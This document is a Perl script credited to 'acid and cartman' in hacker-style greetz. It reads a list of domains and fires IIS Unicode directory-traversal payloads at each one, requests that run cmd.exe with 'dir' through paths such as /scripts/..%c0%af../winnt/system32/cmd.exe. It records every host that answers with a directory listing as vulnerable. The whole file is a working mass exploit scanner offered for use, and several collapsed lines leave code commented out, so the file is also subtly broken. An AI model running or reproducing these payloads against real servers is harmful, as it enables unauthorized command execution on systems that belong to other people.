#!/usr/bin/perl
# Greetz
# c0d3d by acid and cartman
# c4r7m4n, x4n3x, 1mp1, 3mmm 31tch, ScHm0uLd3rz
# u3b3r l1x - emmaich 
use Socket;
# --------------init
if ($#ARGV<0) {die "timay.pl v1.end

usage: timmmaaaayy.pl filename
where filename contains a list of domains to try\n";}

$filename = @ARGV[0];
$port=80;

open FOO, "< $filename";
open DEBUG, "> h4x0r.debug";

print DEBUG "Start search\n";
while (<FOO>) {
open h4x0r, ">> h4x0r";
chomp;
$host = $_;
$target = inet_aton($host);

# Just in case we have the wrong info
if (!($target)) { print DEBUG "DEBUG host: $host does not resolve\n"; next;
}
else { print DEBUG "DEBUG host: $host resolved\n";
}

print "$host : ";

@tests =
("/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir",
"/msadc/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir",
"/scripts/../winnt/system32/cmd.exe?/c+dir",
"/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir",
"/_vti_bin/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir",
"/iisadmpwd/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir",
"/cgi-bin/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir",
"/samples/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir",
"/_vti_cnf/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir",
"/adsamples/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir",
"/msadc/..\%e0\%80\%af../..\%e0\%80\%af../..\%e0\%80\%af../winnt/system32/cmd.exe\?/c\+dir");

for ($i=0;$i<=$#tests;$i++) { my @results=sendraw("GET $tests[$i] HTTP/1.0\r\n\r\n"); foreach $line (@results){ if ($line =~ /Directory/) {  push(@vuln,$i+1); } }
}

# Now we figure out if we were vulnerable or not.
if ($#vuln > -1) { print DEBUG "DEBUG host: $host vulnerable\n"; print h4x0r "$host : "; print "Vulnerable to test(s) : "; print h4x0r "Vulnerable to test(s) : "; for ($i=0;$i<=$#vuln;$i++) { $v = pop(@vuln); print h4x0r "$v "; print "$v "; } print h4x0r "\n"; print "\n";
}
else {  print DEBUG "DEBUG host: $host not vulnerable\n"; print "Not Vulnerable\n";
} print DEBUG "DEBUG Forcing a sync/write to file.."; close hax0r; # Stupid but forces a write print DEBUG "succeeded.\n";
} # End the while loop
print DEBUG "DEBUG END of search\n";
close DEBUG;
close h4x0r;
close FOO;

# ------------- Sendraw - thanx RFP rfp@wiretrip.net
sub sendraw {   # this saves the whole transaction anyway my ($pstr)=@_; socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) || die("Socket problems\n"); if(connect(S,pack "SnA4x8",2,$port,$target)){ my @in; select(S);      $|=1;   print $pstr; while(<S>){ push @in, $_;} select(STDOUT); close(S); return @in; } else { die("Can't connect...\n"); }
}